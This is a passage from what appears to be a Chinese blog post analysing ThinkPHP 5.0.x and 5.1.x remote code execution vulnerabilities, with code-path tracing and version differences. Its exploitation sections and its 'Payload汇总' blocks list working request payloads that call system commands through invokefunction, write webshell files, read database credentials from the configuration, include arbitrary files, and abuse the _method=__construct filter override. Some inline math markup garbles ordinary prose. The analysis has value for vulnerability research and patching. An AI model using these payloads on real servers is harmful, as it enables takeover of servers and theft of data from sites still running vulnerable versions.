我们跟一下传入的参数是不是可控，返回命名空间和方法的参数是否可以调用到我们想实现的方法。</p><p>传入的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">模</mi><mi mathvariant="normal">块</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">制</mi><mi mathvariant="normal">器</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">操</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">由</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">图</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">知</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">result参数为模块/控制器/操作，传入值可控。由上图可知，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">块</span><span class="mord">/</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">器</span><span class="mord">/</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">图</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">，</span></span></span></span>action为传入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">切</mi><mi mathvariant="normal">割</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">三</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">元</mi><mi mathvariant="normal">素</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">为</mi></mrow><annotation encoding="application/x-tex">result切割数组的第三个元素，类名为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">切</span><span class="mord cjk_fallback">割</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">为</span></span></span></span>instance参数，跟一下这个值的产生即可，</p><p><img src="../../../typora-user-images/image-20240724174443495.png" alt="image-20240724174443495" /></p><p><strong>利用流程：</strong></p><ol><li>看回分析流程的第2步，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">controller变量是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span></span></span></span>result切割数组的第二个元素，跟入第3步方法，返回值取决于这个$class值</li></ol><p><img src="../../../typora-user-images/image-20240724175721587.png" alt="image-20240724175721587" /></p><ol start="2"><li>重点在getModuleAndClass静态方法，关注返回的$class。</li></ol><p>看回分析流程的第4步，$class的赋值只有两处：</p><ul><li>第一处逻辑是如果name中包含\，直接返回name做class</li><li>第二处的逻辑我们在第5步分析了，返回值是拼接的，且开头的命名空间为App::$namespace，限制较高</li></ul><p>这样来看我们要让传入的name参数包含\，name实际上就是我们最开始获取的$controller方法</p><p><img src="../../../typora-user-images/image-20240724180055811.png" alt="image-20240724180055811" /></p><p>分析后就很简单了</p><p>我们传入的格式是：模块/控制器/操作，控制器这里我们要传入字符包含\，这样最终处理后就能直接初始化我们想要的class。而\在tp有额外的”命名空间的含义“，这样也就达成了可以初始化任意类的目的</p><p>我们先测试传入index/a\b/1</p><p>发现无法解析\，服务端当作了/处理</p><p><img src="../../../typora-user-images/image-20240724181057139.png" alt="image-20240724181057139" /></p><p>但是tp默认支持多种路由方式，可以使用参数的形式传入</p><p><img src="../../../typora-user-images/image-20240724181538375.png" alt="image-20240724181538375" /></p><p>接下来改一下传参方式：<a href="http://tp5022.com/index.php/?s=index/a%5Cb/%E5%8F%91%E7%8E%B0%E6%9E%9C%E7%84%B6%E5%A6%82%E6%88%91%E4%BB%AC%E6%89%80%E6%96%99%EF%BC%8Cclass%E5%90%8D%E7%A7%B0%E6%88%91%E4%BB%AC%E7%8E%B0%E5%9C%A8%E5%8F%AF%E6%8E%A7%E4%BA%86%E3%80%82">http://tp5022.com/index.php/?s=index/a\b/发现果然如我们所料，class名称我们现在可控了。</a></p><p><img src="../../../typora-user-images/image-20240724181836353.png" alt="image-20240724181836353" /></p><p>我们找一下内部存在的类测试一下：/index/think\app/index</p><p>发现类成功进行了初始化，爆错提示方法不存在而已</p><p><img src="../../../typora-user-images/image-20240724182230104.png" alt="image-20240724182230104" /></p><p>这个漏洞到此也就分析成功，内部逻辑缺陷，导致可以用命名空间的方式来调用任意类的任意方法。</p><p><strong>至于为什么ThinkPHP可以使用命名空间直接实例化，可以看这篇文章：</strong></p><p><a href="https://segmentfault.com/a/1190000020172925">https://segmentfault.com/a/1190000020172925</a></p><p>简单总结就是：正常我们需要include，然后才能尝试实例化，而在tp中，实例化是有如下流程的：</p><p><img src="../../../typora-user-images/image-20240725113342175.png" alt="image-20240725113342175" /></p><p>文中也举例了（如下图），实际上TP默认维护了绑定映射关系，think就是一个根命名空间，其对应的初始命名空间目录就是系统的类库目录（thinkphp/library/think）</p><p><img src="../../../typora-user-images/image-20240725113510376.png" alt="image-20240725113510376" /></p><h2 id="3漏洞利用"><a class="markdownIt-Anchor" href="#3漏洞利用"></a> 3.漏洞利用</h2><p>经过上面的分析，依托TP的命名空间和自动类加载的机制，我们已经获取了实例化任意类的入口，接下来就是看一下TP框架本身哪些方法可以被利用了。</p><h3 id="31遇见问题"><a class="markdownIt-Anchor" href="#31遇见问题"></a> 3.1遇见问题</h3><p>我们在tp找到了一个文件写入类，命名空间应该为：<strong>\think\template\driver\File</strong></p><p><img src="../../../typora-user-images/image-20240725140912344.png" alt="image-20240725140912344" /></p><p>使用payload打一下发现提示控制器不存在，观察一下， 发现控制器的file变成了小写，难怪找不到这个File类</p><p><img src="../../../typora-user-images/image-20240725141123558.png" alt="image-20240725141123558" /></p><p>分析了一下相关大小写相关代码</p><ol><li>发现最初获取控制器名就会转换成小写。</li></ol><p>配置里的url_convert还为true，默认就会转成小写。</p><p><img src="../../../typora-user-images/image-20240725141452713.png" alt="image-20240725141452713" /></p><p><img src="../../../typora-user-images/image-20240725141402353.png" alt="image-20240725141402353" /></p><ol start="2"><li>上面提到的tp会根据命名空间自动寻找对应的类，<code>\think\Loader::autoload</code></li></ol><p>其中有一段非Win环境不严格区分大小写，是windows无法走到下面的include，也就没办法包含到文件</p><p><img src="../../../typora-user-images/image-20240725141739998.png" alt="image-20240725141739998" /></p><h3 id="32漏洞利用总结"><a class="markdownIt-Anchor" href="#32漏洞利用总结"></a> 3.2漏洞利用总结</h3><h4 id="tp-50x-version-5022"><a class="markdownIt-Anchor" href="#tp-50x-version-5022"></a> TP 5.0.x &lt;=version&lt;= 5.0.22</h4><p>由上面的问题，简单跟了一下发现在windows环境下自动加载类根本无法加载到想要类文件，所以只能找框架初始化的时候就已经加载的类。</p><p>在Linux一样如此，处理小写的控制器，拼接文件名还是小写，虽然走到了下面的include，但是因为Linux文件名区分大小写，无法包含到。</p><pre class="line-numbers language-none"><code class="language-none">think\Routethink\Configthink\Errorthink\Appthink\Requestthink\Hookthink\Envthink\Langthink\Logthink\Loader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现可以执行任意方法，且可以执行带参数的方法。</p><p><img src="../../../typora-user-images/image-20240725145500102.png" alt="image-20240725145500102" /></p><p><img src="../../../typora-user-images/image-20240725150328217.png" alt="image-20240725150328217" /></p><p><strong>最终可用payload：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>var_dump<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># 打印的方式检测漏洞</span><span class="token operator">?</span>s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>shell1213<span class="token operator">.</span>php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># 文件写入</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token operator">.</span>username <span class="token comment"># 获取配置信息</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Lang<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>test<span class="token operator">.</span>jpg    <span class="token comment"># 包含任意文件</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Config<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>t<span class="token operator">.</span>php     <span class="token comment"># 包含任意.php文件</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id  <span class="token comment">#执行系统命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="tp-51x-version-5130"><a class="markdownIt-Anchor" href="#tp-51x-version-5130"></a> TP 5.1.x &lt;=version&lt;= 5.1.30</h4><p>5.1的具体漏洞分析流程就不分析了，大致与5.0相似，虽然相似度不高，但是直接往下跟控制器的赋值就行了</p><p>上面5.0遇到的问题，在5.1存在吗？看一下两处的代码：</p><ul><li>获取控制器部分</li></ul><p>默认对获取的值也是会小写的</p><p><img src="../../../typora-user-images/image-20240725164747021.png" alt="image-20240725164747021" /></p><p><img src="../../../typora-user-images/image-20240725164730640.png" alt="image-20240725164730640" /></p><ul><li>类自动加载部分</li></ul><p>逻辑与5.0相同，写法，但还是无法加载</p><p><img src="../../../typora-user-images/image-20240725164906870.png" alt="image-20240725164906870" /></p><p>只能寻找初始化时已经加载（include）的类</p><pre class="line-numbers language-none"><code class="language-none">think\Loader Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561think\Error think\Containerthink\App think\Env think\Config think\Hook think\Facadethink\facade\Envenvthink\Dbthink\Lang think\Request think\Log think\log\driver\Filethink\facade\Routeroutethink\Route think\route\Rulethink\route\RuleGroupthink\route\Domainthink\route\RuleItemthink\route\RuleNamethink\route\Dispatchthink\route\dispatch\Urlthink\route\dispatch\Modulethink\Middlewarethink\Cookiethink\Viewthink\view\driver\Thinkthink\Templatethink\template\driver\Filethink\Sessionthink\Debugthink\Cachethink\cache\Driverthink\cache\driver\File<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现**\think\template\driver\File**类在5.1已经在初始化时就已经加载，所以可以使用。</p><p><strong>可用payload：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\Request/input&amp;filter[]=system&amp;data=whomai # callback回调?s=index/\think\view\driver\Think/display&amp;template=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>   #shell生成在runtime/temp/md5(template).php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> # 写文件?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # 命令执行?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # 命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4payload汇总"><a class="markdownIt-Anchor" href="#4payload汇总"></a> 4.Payload汇总</h2><h3 id="tp-50"><a class="markdownIt-Anchor" href="#tp-50"></a> TP 5.0</h3><pre class="line-numbers language-none"><code class="language-none">s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;var_dump&amp;vars[0]&#x3D;123123 # 打印的方式检测漏洞?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1213.php&amp;vars[1][]&#x3D;123123 # 文件写入?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id  #执行系统命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tp-51"><a class="markdownIt-Anchor" href="#tp-51"></a> TP 5.1</h3><pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whomai # callback回调?s&#x3D;index&#x2F;\think\view\driver\Think&#x2F;display&amp;template&#x3D;&lt;?php phpinfo();?&gt;   #shell生成在runtime&#x2F;temp&#x2F;md5(template).php?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt; # 写文件?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # 命令执行?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # 命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-thinkphp-5x命令执行method任意调用方法导致rce"><a class="markdownIt-Anchor" href="#0x03-thinkphp-5x命令执行method任意调用方法导致rce"></a> 0x03 ThinkPHP 5.x命令执行（method任意调用方法导致RCE）</h1><h2 id="1影响版本-2"><a class="markdownIt-Anchor" href="#1影响版本-2"></a> 1.影响版本</h2><p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.23</p><p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.32</p><p>看一下patch：</p><p><img src="../../../typora-user-images/image-20240726150103603.png" alt="image-20240726150103603" /></p><p>简单分析了下，发现对POST参数进行了白名单判断，限定了POST获取的var_method参数。</p><h2 id="2漏洞分析-2"><a class="markdownIt-Anchor" href="#2漏洞分析-2"></a> 2.漏洞分析</h2><p>通过上面的分析，很容易想到利用方式：</p><ul><li>method从POST参数获取并转为大写（PHP的函数是不区分大小写的，所以转大写也无所谓了）</li><li>接下来会调用Request类的对应方法，参数为POST参数</li></ul><p>只要找Request类中可以被利用的方法（方法参数只能有1个）就可以了。</p><p>找了一圈发现不存在直接利用的，发现有一个可以覆盖任意属性的__contruct方法</p><p><img src="../../../typora-user-images/image-20240726180501090.png" alt="image-20240726180501090" /></p><p>接下来的思路就是寻找TP框架接收参数或者处理路由的时候是否会调用Request的参数了，这样的话我们就能利用此类赋值恶意属性，达成利用效果了。</p><p>但在开始之前，我们先简单跟一下，如何可以触发最开始的diff的位置</p><p>Request是TP处理请求的类，只要发起请求就会触发到此类，method是处理路由的方法，所以很容易触发diff位置。</p><p><img src="../../../typora-user-images/image-20240727171455416.png" alt="image-20240727171455416" /></p><p><img src="../../../typora-user-images/image-20240727153232409.png" alt="image-20240727153232409" /></p><p>接下来就是寻找可能利用Request中恶意参数的位置了，大致的挖掘思路如下：</p><ul><li>从TP的入口开始跟，发现调用Request的方法就跟进去</li><li>然后再看方法可不可以进行恶意利用（写文件，callback执行等），</li><li>最后看参数是否可控</li></ul><ol><li><p>入口点为APP 的run静态方法</p><p><img src="../../../typora-user-images/image-20240727155146208.png" alt="image-20240727155146208" /></p></li><li><p>跟入param方法，request变量为初始化的Request类对象</p><p><img src="../../../typora-user-images/image-20240727155758652.png" alt="image-20240727155758652" /></p></li><li><p>跟入方法，发现method方法，继续跟入</p></li></ol><p><img src="../../../typora-user-images/image-20240802155452448.png" alt="image-20240802155452448" /></p><ol start="4"><li>参数为true，会调用到server方法</li></ol><p><img src="../../../typora-user-images/image-20240802155537768.png" alt="image-20240802155537768" /></p><ol start="5"><li>调用server方法，跟入其中的input方法</li></ol><p><img src="../../../typora-user-images/image-20240802155613522.png" alt="image-20240802155613522" /></p><ol start="6"><li>看一下其中的filterValue方法</li></ol><p><img src="../../../typora-user-images/image-20240727160127104.png" alt="image-20240727160127104" /></p><ol start="7"><li>发现callback触发点</li></ol><p><img src="../../../typora-user-images/image-20240727160212522.png" alt="image-20240727160212522" /></p><p>利用流程已经整理好了，要完成完整的利用链，还要考虑两点：</p><ul><li><ol><li>整个过程中的if条件都能符合吗？</li></ol></li><li><ol start="2"><li>还有没有其他的调用最初param方法的位置？</li></ol></li></ul><h3 id="21遇见问题需要开启debug的利用链"><a class="markdownIt-Anchor" href="#21遇见问题需要开启debug的利用链"></a> 2.1遇见问题（需要开启debug的利用链）</h3><p>我们看回漏洞分析2步骤的if逻辑，看一下debug的静态属性是什么含义。</p><p>分析了一下该变量就是系统debug配置，类调用run方法时会进行属性的初始化。</p><p>也就是说，我们想触发上面的调用链，第一个if条件就要符合，也就是说<strong>系统需要开启debug模式才行</strong>。</p><p><img src="../../../typora-user-images/image-20240727161239734.png" alt="image-20240727161239734" /></p><p>先调通Payload，在链条中找到可被赋值的Request的属性</p><p><img src="../../../typora-user-images/image-20240727174846709.png" alt="image-20240727174846709" /></p><p><img src="../../../typora-user-images/image-20240727174908476.png" alt="image-20240727174908476" /></p><p>现在可以POST传参对类的filter属性赋值了，$filter也就是callback中调用的函数</p><p><img src="../../../typora-user-images/image-20240802144020516.png" alt="image-20240802144020516" /></p><p>接下来就是callback的函数参数的值了，在这里就是filterValue函数的$data参数了，找一下赋值的地方。</p><p><img src="../../../typora-user-images/image-20240802144908829.png" alt="image-20240802144908829" /></p><p><img src="../../../typora-user-images/image-20240802144825176.png" alt="image-20240802144825176" /></p><p>跟回去赋值$data的地方，发现也是Request类的属性，所以一样可以使用上面的方式</p><p>我们使用server变量赋值，走到filterValue函数上面的if逻辑，发现无法满足这个if，会直接return，无法触发上面的filterValue函数</p><p><img src="../../../typora-user-images/image-20240802153133966.png" alt="image-20240802153133966" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$val</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入的参数还要满足如下逻辑，才不会return，这里的data是我们赋值的server变量，解决办法也很简单，我们传入一个输入，满足存在$val键值即可。</p><p>也就是server[REQUEST_METHOD]=12312</p><p>完成利用</p><p><img src="../../../typora-user-images/image-20240802154035302.png" alt="image-20240802154035302" /></p><h3 id="22不开启debug情况下的利用链"><a class="markdownIt-Anchor" href="#22不开启debug情况下的利用链"></a> 2.2不开启Debug情况下的利用链</h3><p>上面也简单提到过，既然没有开启debug，我们就要寻找其他的漏洞触发点</p><ol><li>在App类的方法寻找， 发现其中有调用param方法的位置。</li></ol><p><img src="../../../typora-user-images/image-20240813155235697.png" alt="image-20240813155235697" /></p><ol start="2"><li>反向往回跟，跟invokeMethod方法</li></ol><p><img src="../../../typora-user-images/image-20240813155441971.png" alt="image-20240813155441971" /></p><ol start="3"><li>反向跟module方法</li></ol><p><img src="../../../typora-user-images/image-20240813155810783.png" alt="image-20240813155810783" /></p><ol start="4"><li>找到exec方法</li></ol><p><img src="../../../typora-user-images/image-20240813155907274.png" alt="image-20240813155907274" /></p><ol start="5"><li>最终找到触发点，实际上就在我们上面分析的debug下面的位置</li></ol><p><img src="../../../typora-user-images/image-20240813155948369.png" alt="image-20240813155948369" /></p><ol start="6"><li>找到完整触发链，接下来就是找callback的函数的参数，尽量做到可控</li></ol><p>$filter变量和上面debug那条相同，是获取的this属性，可以使用construct方式对filter属性赋值。</p><p><img src="../../../typora-user-images/image-20240813160850291.png" alt="image-20240813160850291" /></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">赋</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">合</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">看</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">间</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">data变量赋值在此，是数组合并的。看中间的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">的</span></span></span></span>vars，赋值在上面，其实获取的是所有的post参数</p><p><img src="../../../typora-user-images/image-20240813163516793.png" alt="image-20240813163516793" /></p><p>最终callback递归调用filterValue，$data数据键值是我们post的data</p><p><img src="../../../typora-user-images/image-20240813165432649.png" alt="image-20240813165432649" /></p><p>最终也会使用callback调用我们传的参数，完成整条链的调用</p><pre class="line-numbers language-none"><code class="language-none">aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240813165645059.png" alt="image-20240813165645059" /></p><p><strong>我们使用网上的payload做调试的时候，使用calc可能发现弹出来很多个计算器，原因其实也在我们上面的分析过程：</strong></p><p>param是三个参数获取拼接的，我们callback调用是循环调用，filter和参数都是笛卡尔积执行的，最终执行的时候也就执行了calc。</p><p><img src="../../../typora-user-images/image-20240813170430023.png" alt="image-20240813170430023" /></p><h2 id="3-不同版本的payload区别分析"><a class="markdownIt-Anchor" href="#3-不同版本的payload区别分析"></a> 3. 不同版本的Payload区别分析</h2><h4 id="tp-500version507"><a class="markdownIt-Anchor" href="#tp-500version507"></a> TP 5.0.0&lt;=version&lt;=5.0.7</h4><p>我们上面调试的payload是5.0.12版本的，使用的payload是<code>aaaaa=calc&amp;_method=__construct&amp;filter[]=system</code></p><p>在5.0.7使用上面分析的payload，开启debug分析一下，发现会报错。</p><p><img src="../../../typora-user-images/image-20240815105135342.png" alt="image-20240815105135342" /></p><p>对比一下tp5.0.7的代码，发现<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>u</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">高</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mi mathvariant="normal">做</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">处</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">低</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mi mathvariant="normal">没</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">越</mi><mi mathvariant="normal">界</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">析</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">获</mi><mi mathvariant="normal">取</mi></mrow><annotation encoding="application/x-tex">rules这里，在高版本做了判断处理，低版本没有值会数组越界，分析一下获取</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">高</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span 